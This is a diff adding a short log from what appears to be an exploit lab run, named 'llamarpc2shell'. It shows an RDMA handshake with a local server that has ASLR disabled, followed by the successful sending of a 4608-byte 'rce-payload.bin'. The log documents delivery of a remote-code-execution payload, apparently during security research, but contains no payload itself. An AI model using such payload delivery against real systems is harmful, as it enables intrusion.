@@ -1,0 +1,9 @@
+=== server: /home/mesh-home/mishe-tauftauf2shell/lab/frontier/llamarpc2shell/wire/server-noaslr.sh -H 127.0.0.1 -p 53052, payload 43 bytes ===
+gid[0] type=2 raw=fe80000000000000020000fffe000000
+gid[1] type=2 raw=00000000000000000000ffff7f000001
+device=rxe0 port=1 gid_index=1 gid_type=2 mtu=5
+sent HELLO: qpn=17 psn=17
+HELLO rsp v8.0.0 caps qpn=18 psn=18 gid=00000000000000000000ffff7f000001
+QP RTS, posting 43-byte SEND
+loaded 4608 bytes from /home/mesh-home/mishe-tauftauf2shell/lab/frontier/llamarpc2shell/wire/evidence/rce-payload.bin
+send wc status=0 opcode=0 byte_len=4608 wr_id=0 inline=0
